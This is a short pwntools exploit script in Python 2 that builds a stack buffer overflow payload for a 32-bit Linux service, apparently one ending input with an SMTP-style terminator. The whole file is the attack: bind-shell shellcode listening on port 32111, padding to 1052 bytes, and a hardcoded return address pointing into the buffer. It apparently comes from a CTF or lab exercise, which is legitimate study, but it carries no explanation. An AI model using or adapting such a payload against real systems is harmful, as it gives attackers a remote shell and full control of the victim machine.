from pwn import *

context.arch = 'i386'

shellcraft.i386.linux.push = shellcraft.i386.push
shellcraft.i386.linux.mov = shellcraft.i386.mov


shellcode = ''
shellcode += shellcraft.acceptloop_ipv4(32111)
shellcode += shellcraft.dupsh()


payload = ''
payload += asm(shellcode)
payload += 'a' * (1052 - len(payload))
payload += p32(0xbfffe710) # adres bufora
payload += '\r\n.\r\n'

print payload
